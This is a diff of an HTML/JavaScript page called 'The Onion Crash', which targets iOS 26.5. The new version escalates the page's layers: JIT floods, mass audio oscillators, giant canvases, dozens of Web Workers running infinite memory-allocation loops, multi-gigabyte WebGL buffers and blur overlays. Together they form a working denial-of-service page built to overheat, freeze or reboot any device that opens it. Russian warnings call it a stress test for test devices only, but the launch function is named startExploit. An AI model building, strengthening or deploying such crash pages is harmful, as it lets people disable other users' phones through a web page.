@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>The Onion Crash v2.8 — iOS 26.5 MAX</title>
+    <title>The Onion Crash v2.9 — iOS 26.5 ULTRA</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
         :root { --pink: #ff00ff; --cyan: #00ffff; --red: #ff0044; }
@@ -12,26 +12,26 @@
             background: #0a000f; color: #00ffcc; font-family: 'Press Start 2P', system-ui;
             height: 100vh; overflow-y: auto; display: flex; align-items: center; justify-content: center; position: relative;
         }
-        .grid { position: absolute; inset: 0; background: linear-gradient(rgba(255,0,255,0.06) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px); background-size: 35px 35px; animation: gridMove 12s linear infinite; z-index: 0; }
-        @keyframes gridMove { 0% {background-position:0 0} 100% {background-position:-140px -140px} }
-        .scanline { position: absolute; inset: 0; background: linear-gradient(transparent 50%, rgba(255,20,80,0.15) 50%); background-size: 100% 5px; animation: scan 2.8s linear infinite; z-index: 1; }
-        @keyframes scan { 0%{transform:translateY(-180%)} 100%{transform:translateY(450%)} }
+        .grid { position: absolute; inset: 0; background: linear-gradient(rgba(255,0,255,0.07) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,0.07) 1px, transparent 1px); background-size: 30px 30px; animation: gridMove 10s linear infinite; z-index: 0; }
+        @keyframes gridMove { 0% {background-position:0 0} 100% {background-position:-200px -200px} }
+        .scanline { position: absolute; inset: 0; background: linear-gradient(transparent 50%, rgba(255,30,90,0.2) 50%); background-size: 100% 4px; animation: scan 2s linear infinite; z-index: 1; }
+        @keyframes scan { 0%{transform:translateY(-200%)} 100%{transform:translateY(500%)} }
         .container {
-            position: relative; z-index: 2; width: 94%; max-width: 780px;
+            position: relative; z-index: 2; width: 94%; max-width: 800px;
             background: rgba(15,0,35,0.97); border: 6px solid var(--pink);
-            box-shadow: 0 0 80px var(--pink); padding: 45px 30px; border-radius: 20px;
+            box-shadow: 0 0 90px var(--pink), 0 0 40px var(--red); padding: 50px 30px; border-radius: 20px;
         }
-        h1 { font-size: 2.8em; color: var(--pink); text-shadow: 0 0 30px var(--pink); animation: flicker 0.6s infinite alternate; }
-        @keyframes flicker { 0% {opacity:0.75} 100% {opacity:1} }
+        h1 { font-size: 2.9em; color: var(--pink); text-shadow: 0 0 35px var(--pink); animation: flicker 0.5s infinite alternate; }
+        @keyframes flicker { 0% {opacity:0.7} 100% {opacity:1} }
         button {
-            font-family: 'Press Start 2P', system-ui; padding: 26px 70px; font-size: 1.5em;
+            font-family: 'Press Start 2P', system-ui; padding: 28px 75px; font-size: 1.55em;
             background: transparent; color: #00ff99; border: 6px solid #00ff99;
-            cursor: pointer; box-shadow: 0 0 50px #00ff99; transition: all 0.4s;
-            display: block; margin: 30px auto;
+            cursor: pointer; box-shadow: 0 0 55px #00ff99; transition: all 0.4s;
+            display: block; margin: 35px auto;
         }
-        button:hover { background:#00ff99; color:#000; transform:scale(1.12); }
-        #progress, #status { margin: 30px 0; padding: 20px; background: #000000dd; border: 3px solid var(--cyan); font-size: 0.96em; text-align: left; display: none; }
-        #status { height: 260px; overflow-y: auto; }
+        button:hover { background:#00ff99; color:#000; transform:scale(1.15); }
+        #progress, #status { margin: 30px 0; padding: 22px; background: #000000dd; border: 3px solid var(--cyan); font-size: 0.97em; text-align: left; display: none; }
+        #status { height: 280px; overflow-y: auto; }
     </style>
 </head>
 <body>
@@ -39,19 +39,19 @@
     <div class="scanline"></div>
     
     <div class="container">
-        <h1>🧅 THE ONION CRASH v2.8</h1>
-        <p style="color:#ff0088; text-align:center; margin:15px 0 30px;">iOS 26.5 MAX STRESS TEST</p>
+        <h1>🧅 THE ONION CRASH v2.9</h1>
+        <p style="color:#ff0088; text-align:center; margin:15px 0 35px;">iOS 26.5 ULTRA PRESSURE</p>
         
-        <div style="background:rgba(160,0,0,0.5); border:5px solid #ff2222; padding:25px; margin:30px 0; color:#ffdddd; border-radius:12px;">
-            <strong>⚠️ ТОЛЬКО ДЛЯ ТЕСТОВЫХ УСТРОЙСТВ</strong><br>
-            Это не эксплойт. Это тяжёлый стресс-тест. Может вызвать перезагрузку.
+        <div style="background:rgba(180,0,0,0.55); border:5px solid #ff2222; padding:28px; margin:30px 0; color:#ffdddd; border-radius:12px;">
+            <strong>⚠️ МАКСИМАЛЬНО ЖЁСТКИЙ СТРЕСС-ТЕСТ</strong><br>
+            Только тестовое устройство. Может сильно нагреть телефон и вызвать ребут.
         </div>
         
-        <button id="runBtn">▶ ЗАПУСТИТЬ МАКСИМАЛЬНЫЙ СТРЕСС</button>
+        <button id="runBtn">▶ ЗАПУСТИТЬ ULTRA CASCADE</button>
         
         <div id="confirm" style="display:none; margin:30px 0; text-align:center;">
-            <p style="color:#ff5555; font-size:1.25em;">МОЖЕТ ПЕРЕЗАГРУЗИТЬ УСТРОЙСТВО!<br>Ты уверен?</p>
-            <button id="confirmYes" style="background:#550000; color:white; border:5px solid #ff4444; padding:20px 55px;">ДА, ЗАПУСКАЙ</button>
+            <p style="color:#ff5555; font-size:1.3em;">ТЕЛЕФОН МОЖЕТ ПЕРЕГРЕТЬСЯ И ПЕРЕЗАГРУЗИТЬСЯ!<br>Продолжить?</p>
+            <button id="confirmYes" style="background:#550000; color:white; border:5px solid #ff4444; padding:22px 60px;">ДА, Я ГОТОВ</button>
         </div>
         
         <div id="progress"></div>
@@ -65,69 +65,83 @@
 
     <script>
         const LAYERS = [
-            ...Array.from({length:10}, (_,i) => ({group:"LOW", name:`Memory JIT ${i+1}`, fn: async () => {
-                for(let j=0;j<900;j++) try{new Function('x',`return x*${Math.random()}`)();}catch(e){}
-                try{new WebAssembly.Memory({initial:65536});}catch(e){}
+            ...Array.from({length:12}, (_,i) => ({group:"PREP", name:`Heavy JIT ${i+1}`, fn: async () => {
+                for(let j=0; j<1200; j++) try { new Function('x', `return x * ${Math.random() * 999999}`)(); } catch(e){}
             }})),
-            
-            {group:"MEDIUM", name:"Audio + Canvas 24k", fn:async()=>{
+
+            {group:"HIGH", name:"Massive Audio + Canvas", fn:async()=>{
                 const ctx = new (window.AudioContext||window.webkitAudioContext)();
-                for(let i=0;i<600;i++) try{const o=ctx.createOscillator();o.connect(ctx.destination);o.start();}catch(e){}
-                const c=document.createElement('canvas'); c.width=c.height=24576;
-                try{const gl=c.getContext('2d',{alpha:false});gl.fillRect(0,0,c.width,c.height);for(let k=0;k<5;k++)c.toDataURL();}catch(e){}
-            }},
-            
-            {group:"HIGH", name:"MONSTER Canvas x8", fn:async()=>{
-                for(let i=0; i<8; i++) {
+                for(let i=0;i<800;i++) try{const o=ctx.createOscillator();o.connect(ctx.destination);o.start();}catch(e){}
+                
+                for(let i=0; i<9; i++) {
                     const c = document.createElement('canvas');
-                    c.width = 32768; c.height = 24576;
+                    c.width = c.height = 24576;
+                    try {
+                        const gl = c.getContext('2d', {alpha:false});
+                        gl.fillRect(0,0,c.width,c.height);
+                        c.toDataURL('image/png');
+                    } catch(e){}
+                }
+            }},
+
+            {group:"HIGH", name:"INSANE Canvas Bomb", fn:async()=>{
+                for(let i=0; i<10; i++) {
+                    const c = document.createElement('canvas');
+                    c.width = 32768; c.height = 32768;
                     try {
                         const ctx = c.getContext('2d', {alpha: false, desynchronized: true});
-                        ctx.fillStyle = '#00ffff';
+                        ctx.fillStyle = '#0ff';
                         ctx.fillRect(0,0,c.width,c.height);
                     } catch(e){}
                 }
             }},
-            
-            {group:"HIGH", name:"Worker Memory Hell", fn:async()=>{
-                for(let i=0; i<100; i++) {
+
+            {group:"HIGH", name:"Worker Memory Apocalypse", fn:async()=>{
+                for(let i=0; i<120; i++) {
                     try {
-                        const blob = new Blob([`while(true){ new ArrayBuffer(1024*1024*128); new Array(15000000).fill(0).map((_,k)=>k*k); }`]);
+                        const blob = new Blob([`
+                            while(true) {
+                                new ArrayBuffer(1024*1024*160);
+                                let heavy = new Float64Array(20000000);
+                                for(let k=0; k<heavy.length; k++) heavy[k] = k * Math.random();
+                            }
+                        `]);
                         new Worker(URL.createObjectURL(blob));
                     } catch(e){}
                 }
             }},
-            
-            {group:"HIGH", name:"WebGL Buffer Storm", fn:async()=>{
+
+            {group:"HIGH", name:"WebGL Extreme Pressure", fn:async()=>{
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl2') || c.getContext('webgl');
                 if(gl) {
-                    for(let i=0; i<20; i++) {
+                    for(let i=0; i<25; i++) {
                         try {
                             const buf = gl.createBuffer();
                             gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                            gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*1800, gl.STATIC_DRAW);
+                            gl.bufferData(gl.ARRAY_BUFFER, 1024*1024*2048, gl.STATIC_DRAW);
                         } catch(e){}
                     }
                 }
             }},
-            
-            {group:"HIGH", name:"FINAL MAX COMBO", fn:async()=>{
-                try { new ArrayBuffer(1024*1024*800); } catch(e){}
-                await new Promise(r => setTimeout(r, 5500));
+
+            {group:"HIGH", name:"FINAL ULTRA COMBO", fn:async()=>{
+                try { new ArrayBuffer(1024*1024*1024); } catch(e){}
+                await new Promise(r => setTimeout(r, 6500));
             }},
-            
-            ...Array.from({length:45}, (_,i) => ({group:"HIGH", name:`Deep Layer ${i+1}`, fn: async () => {
+
+            ...Array.from({length:50}, (_,i) => ({group:"NUCLEAR", name:`Nuclear Layer ${i+1}`, fn: async () => {
                 try {
-                    new ArrayBuffer(1024*1024*220);
+                    new ArrayBuffer(1024*1024*280);
                     const d = document.createElement('div');
-                    d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(280px);opacity:0.23;z-index:999999;pointer-events:none;`;
+                    d.style.cssText = `position:fixed;inset:0;backdrop-filter:blur(320px);opacity:0.18;z-index:999999;pointer-events:none;`;
                     document.body.appendChild(d);
                 } catch(e){}
-                await new Promise(r => setTimeout(r, 160));
+                await new Promise(r => setTimeout(r, 180));
             }}))
         ];
 
+        // ... (остальной код без изменений, как в v2.8)
         let currentSession = null;
         let isRunning = false;
 
@@ -177,7 +191,7 @@
                 stat.innerHTML += ` <span style="color:#f80">ERR</span>`;
             }
             saveSession();
-            await new Promise(r => setTimeout(r, 90));
+            await new Promise(r => setTimeout(r, 120));
         }
 
         async function startExploit() {
@@ -186,7 +200,7 @@
             document.getElementById('runBtn').disabled = true;
             currentSession = { id: Date.now(), start: new Date().toISOString(), status: 'running', layers: LAYERS.map(l => ({name: l.name, status: 'pending'})) };
             saveSession();
-            document.getElementById('status').innerHTML = '☢️ MAX STRESS FOR iOS 26.5 STARTED...';
+            document.getElementById('status').innerHTML = '☢️ ULTRA PRESSURE STARTED...';
             for (let i = 0; i < LAYERS.length; i++) {
                 if (!isRunning) break;
                 await runLayer(LAYERS[i], i);
